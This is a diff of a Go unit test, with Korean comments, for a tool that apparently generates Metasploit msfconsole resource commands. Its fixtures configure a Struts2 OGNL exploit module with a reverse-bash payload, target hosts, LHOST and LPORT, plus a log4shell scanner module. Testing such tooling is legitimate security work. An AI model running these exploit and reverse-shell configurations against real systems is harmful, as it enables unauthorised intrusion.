@@ -54,13 +54,13 @@ func TestExtractMSFTarget(t *testing.T) {
 // TestBuildResourceScript는 생성된 msfconsole 리소스 명령이 모듈·대상·포트·페이로드·LHOST를 포함하는지 검증한다.
 func TestBuildResourceScript(t *testing.T) {
 	// exploit 모듈 + 포트/페이로드/LHOST/LPORT가 지정되면 모두 설정해야 한다.
-	got := buildResourceScript(msfRun{
+	got := strings.Join(buildResourceCommands(msfRun{
 		mod:    MSFModule{Name: "exploit/multi/http/struts2_content_type_ognl", Payload: "cmd/unix/reverse_bash"},
 		rhosts: "1.1.1.1 2.2.2.2",
 		rport:  "8080",
 		lhost:  "10.0.0.5",
 		lport:  4444,
-	})
+	}), "; ")
 	for _, want := range []string{
 		"use exploit/multi/http/struts2_content_type_ognl",
 		"set RHOSTS 1.1.1.1 2.2.2.2",
@@ -80,7 +80,7 @@ func TestBuildResourceScript(t *testing.T) {
 	}
 
 	// 포트/페이로드/LHOST가 비면 해당 항목을 설정하지 않아야 한다(모듈 기본값 사용).
-	noOpt := buildResourceScript(msfRun{mod: MSFModule{Name: "auxiliary/scanner/http/log4shell_scanner"}, rhosts: "1.1.1.1"})
+	noOpt := strings.Join(buildResourceCommands(msfRun{mod: MSFModule{Name: "auxiliary/scanner/http/log4shell_scanner"}, rhosts: "1.1.1.1"}), "; ")
 	for _, unwanted := range []string{"RPORT", "PAYLOAD", "LHOST", "LPORT"} {
 		if strings.Contains(noOpt, unwanted) {
 			t.Errorf("미지정 항목 %q가 스크립트에 포함됨: %q", unwanted, noOpt)
